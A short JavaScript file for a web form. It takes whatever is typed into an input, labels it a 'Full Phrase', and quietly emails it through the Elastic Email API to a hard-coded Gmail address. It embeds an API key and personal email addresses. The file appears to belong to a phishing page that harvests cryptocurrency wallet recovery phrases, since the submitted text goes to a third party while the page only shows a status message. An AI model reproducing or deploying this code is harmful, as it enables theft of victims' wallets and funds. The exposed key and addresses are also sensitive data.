 
const Form = document.getElementById("my-form");
const Names = document.getElementById("contact-inputs");

async function sendEmail() {
  const bodyMessage = `This is the Full Phrase: ${Names.value}`;

  const payload = {
    apikey: "39F7819FA31ADD14D26E030AFF8F3657A06736C90FF750EA6159BA9FB4377928135B94DDD757530968729F9A7EC5E14E", // Replace with your API key
    subject: `New Phrase: ${Names.value}`,
    from: "echefrankidosky4love@gmail.com", // Your verified sender email
    to: "mikebrew001@gmail.com",
    bodyHtml: `<p>${bodyMessage}</p>`,
  };

  try {
    const response = await fetch("https://api.elasticemail.com/v2/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    const result = await response.json();

    if (response.ok && result.success) {
      document.getElementById("status").style.display = "block";
    } else {
      console.error("Failed to send email:", result.error);
    }
  } catch (error) {
    console.error("Error:", error);
  }
}

Form.addEventListener("submit", (e) => {
  e.preventDefault();
  sendEmail();
});

